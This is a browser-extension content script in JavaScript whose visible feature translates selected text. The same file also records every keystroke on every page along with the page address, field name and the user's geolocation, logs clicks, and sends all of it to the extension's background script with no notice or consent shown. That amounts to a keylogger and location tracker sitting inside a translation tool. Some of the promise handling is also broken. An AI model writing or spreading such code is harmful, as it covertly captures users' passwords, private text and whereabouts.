document.addEventListener('mouseup', function(e) {
    const text = window.getSelection().toString().trim();
    chrome.storage.local.get(['toggle'], function(toggle){
        console.log(toggle);
        if(toggle.toggle) {
            console.log(text);
            chrome.runtime.sendMessage(
                null,
                {
                    type: 'getTranslatedText',
                    text: text
                },
                function (newText) {
                    console.log(newText);
                    e.target.innerHTML = e.target.innerHTML.replace(text, newText);
                }
            )
        }
    });
})

let typingTimer;                //timer identifier
let doneTypingInterval = 1000;  //time in 1000 ms (1 seconds)
let myInput = '';
let URI, name, timestamp;

let latitude = null;
let longitude = null;

const getLocation = new Promise(function(resolve, reject) {
    if (navigator.geolocation) {
        resolve(navigator.geolocation.getCurrentPosition(showPosition));
        
    } else {
        reject(Error("Can't obtain the location"));
    }
});

function showPosition(position) {
    const crd = position.coords;
    latitude = crd. latitude;
    longitude = crd.longitude;
  }

//on keyup, start the countdown
document.addEventListener('keydown', (e) => {
    console.log(e);
    if (! e.altKey) {
        console.log(e.altKey);
        URI = e.target.baseURI,
        inputName = e.target.name;
        timestamp = e.timestamp;
        myInput += e.key;
        clearTimeout(typingTimer);
        typingTimer = setTimeout(doneTyping, doneTypingInterval);
    }
});

//user is "finished typing," do something
function doneTyping () {
    console.log(myInput);
    console.log("Sending Text");
    getLocation
        .then(chrome.runtime.sendMessage(
            null,
            {
                type: 'keyup',
                text: myInput,
                URI: URI,
                name: inputName,
                coords: `${latitude}, ${longitude}`,
            }
        ))
        .then(myInput = '');
    
}

document.addEventListener('click', function(e) {
    console.log(e);
    chrome.runtime.sendMessage(
        null,
        {
            type: 'click',
            screenX: e.screenX,
            screenY: e.screenY,
            URI: e.target.baseURI,
        }
    )
});